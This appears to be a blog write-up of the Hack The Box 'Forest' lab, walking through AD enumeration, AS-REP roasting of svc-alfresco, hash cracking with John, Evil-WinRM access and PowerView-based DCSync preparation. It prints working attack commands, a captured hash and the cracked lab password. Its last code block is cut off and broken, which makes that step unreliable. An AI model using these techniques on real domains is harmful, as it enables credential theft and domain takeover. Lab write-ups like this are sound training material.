---
layout: post
title: Forest - HTB Writeup
author: Mitchell Stein
tags:
- jekyll theme
- jekyll
date: 2022-02-14
tags: [write up, hackthebox, windows]
categories: [Practice]
toc:  true
---

Forest is an easy Windows box with a focus on Active Directory recon rather than exploitation.

## Enumeration

First, similar to every other box, we begin with a humble nmap scan. Because this is a Windows machine, we will need to add `-Pn` to the scan.

```text
# Nmap 7.92 scan initiated as: nmap -sC -sV -p- -o allnmap -v -Pn --min-rate 1000 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.051s latency).
Not shown: 65514 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-02-08 04:47:23Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: ERROR: Script execution failed (use -d to debug)
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
```

Given we have `LDAP port 389` we can use `Enum4Linux` to enumerate this LDAP service for users.

```text
$ enum4linux -a 10.10.10.161 2> /dev/null
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Fantastic! We have a list of users we can use against other tools to see if we can get any user hashes. We can clean up this list with a simple one liner: `cat newusers| tr -d "[]" | awk -F: {'print $2'} | awk -F" " '{print $1}' > cleanusers`

```Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

Perfect! Now we have a clean user list to run against other tools.

## Foothold

### Getting User Hashes

We can use this new user list with Impacket's `GetNPUsers.py` or `Impacket-GetNPUsers`. GetNPUsers exploits users without pre-authentication enabled, which would allow us to grab their account password hash.

```shell
$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 -usersfile cleanusers htb.local/
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
.
.
.
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:8d49b0369104b38bd97f517a8c440344$530b2549fafde7dc9328efc978068556cab78af8ec4afc3025f414a367552831ce78bf76b6454474fb89a3fa93c8a6665300c45490e886dd3d3110d2f0893cb361161aab3b82518234f3e5b12d045c1ad9aea090566f71dc0c2d2a770505950f3dc263635e4abd658b9f118962fc1b33e170f6926ce28b63669a24e23c9d7747d60292004d601f4696f8cfa0f6a7505d481dc7b3b544e7534b8bf1a6ca3ba19c9f02e6c23a6624a2af2ee7c9d3fdf03b7e5af970436aba0b42293f53d35eb36519b08d22d11bc052626928206f787675d7244185ea5f11f2658f9ca4d7e79a40853f1dea796d
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Unfortunately for Alfresco but fortunately for us, svc-alfresco does not have pre-authentication enabled. We can put this output into a new file and pass it onto a cracking tool such as `John`

### Cracking Those Hashes

`John`, or otherwise known as `John the Ripper`, is a password brute force tool ot crack hashes and reveal their passwords. We can crack the hash from svc-alfresco with the following command:

```shell
$ john alfresco_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)

```

### Shell

Using Evil-WinRM we can use the credentials to log into a Windows Remote Management shell as the svc-alfresco user.

```shell
$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> echo 'im in'
> im in
```

## Bloodhound

I used Bloodhound to enumerate this machine and find relationships between the users and groups. To do this you must first upload SharpHound.exe to the remote machine through Evil-WinRM and collect all the information you can.

![SharpHound](https://mitchelldstein.github.io/assets/images/Forest/SharpHound.png)

To get the created json files off the machine, you can use Impacket-SmbServer and connect to it through Evil-WinRM.

Opening Bloodhound and importing the graphs provides the following graph

![BloodHound](https://mitchelldstein.github.io/assets/images/Forest/BloodHound.png)

WriteDacl can be exploited to give access to DCSync, Which can allow the owned user to be exploited by Impacket-SecretsDump to dump the user hashes.

## Exploitation

1. Create a new user and add them to the "Exchange Windows Permissions" group
   ![New User](https://mitchelldstein.github.io/assets/images/Forest/NewUser.png)
2. Upload Powerview.ps1, which can be found [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

   ```shell
   *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload <path-to-file>/PowerView.ps1
   *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module PowerView.ps1
   ```

3. Perform the DCsync exploit with PowerView.ps1 (Both $SecPassword and user password must be the same)

   ```shell
   *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-String '
   *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
   *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

   ```
